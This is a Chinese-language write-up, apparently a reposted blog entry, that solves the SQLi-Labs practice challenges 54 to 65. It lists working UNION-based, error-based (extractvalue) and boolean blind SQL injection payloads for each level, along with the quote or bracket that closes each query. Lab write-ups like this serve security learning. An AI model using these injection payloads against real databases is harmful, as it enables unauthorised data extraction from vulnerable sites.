---
title: SQLi_Labs靶场Challenges学习分享
url: https://buaq.net/go-146495.html
source: unSafe.sh - 不安全
date: 2023-01-23
fetch_date: 2025-10-04T04:35:07.120007
---

# SQLi_Labs靶场Challenges学习分享

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/39617f9bb20e5a556e13f4a81579bfe1.jpg)

SQLi\_Labs靶场Challenges学习分享

Less-54如果没有点提交按钮将会进入下面的else语句，有过滤，显然突破口在上面。如果点了提交将会setcookie，然后看到有个GET提交的id参数，然后有
*2023-1-22 15:17:37
Author: [xz.aliyun.com(查看原文)](/jump-146495.htm)
阅读量:20
收藏*

---

## **Less-54**

如果没有点提交按钮将会进入下面的else语句，有过滤，显然突破口在上面。如果点了提交将会setcookie，然后看到有个GET提交的id参数，然后有个更新数据库操作，这里限制了10次请求次数，否则更新数据库。

?id=-1%27%20union%20select%201,2,database() --+ //查库

![](https://img-blog.csdnimg.cn/31ff9e7270c0463785420848a9e27192.png)

?id=-1%27union%20select%201,2,group\_concat(table\_name)%20from%20information\_schema.tables%20where%20table\_schema=%27challenges%27--+ //查表

![](https://img-blog.csdnimg.cn/27e07693897641628d86f77b02137401.png)

?id=-1' union select 1,group\_concat(column\_name),3 from information\_schema.columns where table\_name='2P0C18GOWL' %23 //查列

![](https://img-blog.csdnimg.cn/aa9b148c271c448e91a5c21d0b02926a.png)

?id=-1' union select 1,group\_concat(tryy),3 from 2P0C18GOWL%23 //查数据

![](https://img-blog.csdnimg.cn/87795e2217004686a17bdabb6ac6ba44.png)

## **Less-55**

这个题限制了请求14次，不过当测试出闭合情况之后后面就一切顺利了。 先尝试闭合

?id=1'%23 //错误 ?id=1')%23 //错误 ?id=1)%23 //正确

尝试之后发现是用)闭合

?id=-1) union select 1,database(),3%23

![](https://img-blog.csdnimg.cn/ceaea517c77b4c36a50b63c1fa628905.png)

## **Less-56**

这几关都差不多，首先也是尝试闭合

?id=1')%23 //成功闭合

?id=-1') union select 1,database(),3%23

![](https://img-blog.csdnimg.cn/bdf8ffc8e67d43ca80ab45e2df56de0a.png)

## **Less-57**

这关是双引号闭合的

?id=-1" union select 1,database(),3%23

![](https://img-blog.csdnimg.cn/dc6a85fec9c14cc290888b87412d26f1.png)

## **Less-58**

查询之后并没有返回查询数据库当中的数据，不能使用union联合注入，但是有报错回显，可以使用报错注入。

?id=0' and extractvalue(1, concat(0x5c, (select database())))%23

![](https://img-blog.csdnimg.cn/a65781949c7c4f3d9c140c42c158306b.png)

## **Less-59**

SQL语句：

$sql="SELECT \* FROM security.users WHERE id=$id LIMIT 0,1";

?id=1 and extractvalue(1, concat(0x5c, (select database())))%23

![](https://img-blog.csdnimg.cn/af3e2d0cca5e4bf69e87d743e466193d.png)

## **Less-60**

?id=1") and extractvalue(1, concat(0x5c, (select database())))%23

![](https://img-blog.csdnimg.cn/c3c6f953bef04619b263781f00f3fde6.png)

## **Less-61**

?id=1'))and extractvalue(1, concat(0x5c, (select database())))%23

![](https://img-blog.csdnimg.cn/5d58e6571a2c4a2b808a2d0f42f04b7a.png)

## **Less-62**

接下来几关要在130次内完成盲注。只不过有次数限制，很明显不能去爆破

?id=1') and (length(database())=10)%23

?id=1') and ((ascii(mid((select table\_name from information\_schema.tables where table\_schema='challenges' limit 0,1),1,1)))<65)-- #

![](https://img-blog.csdnimg.cn/00ce92fb50e140578218cc6f00d34a9f.png)

## **Less-63**

这关跟上一关一样，唯一的区别在于需要使用单引号闭合

?id=1' and (length(database())=10)%23

?id=1' and ((ascii(mid((select table\_name from information\_schema.tables where table\_schema='challenges' limit 0,1),1,1)))>65)-- #

![](https://img-blog.csdnimg.cn/7d9127105a4044a68a592e751be1adaa.png)

不再赘述！

## **Less-64**

这关跟上一关一样，唯一的区别在于需要使用括号闭合

?id=1)) and (length(database())=10)%23

?id=1)) and ((ascii(mid((select table\_name from information\_schema.tables where table\_schema='challenges' limit 0,1),1,1)))>65)-- #

![](https://img-blog.csdnimg.cn/9a0127dabdf347e5be8a5943e72daede.png)

不再赘述！

## **Less-65**

?id=1") and (length(database())=10)%23

?id=1") and ((ascii(mid((select table\_name from information\_schema.tables where table\_schema='challenges' limit 0,1),1,1)))<65)-- #

![](https://img-blog.csdnimg.cn/6cb44690f8f74bcfbd0db4957ec52327.png)

这几关性质都一样，只不过闭合语句不同，不再赘述

SQL语句：

$sql="SELECT \* FROM security.users WHERE id=($id) LIMIT 0,1";

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

博客:

<https://rdyx0.github.io/>

先知社区：

<https://xz.aliyun.com/u/37846>

SecIN:

<https://www.sec-in.com/author/3097>

CSDN:

<https://blog.csdn.net/weixin_48899364?type=blog>

公众号：

<https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect>

FreeBuf：

<https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85>

文章来源: https://xz.aliyun.com/t/12061
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)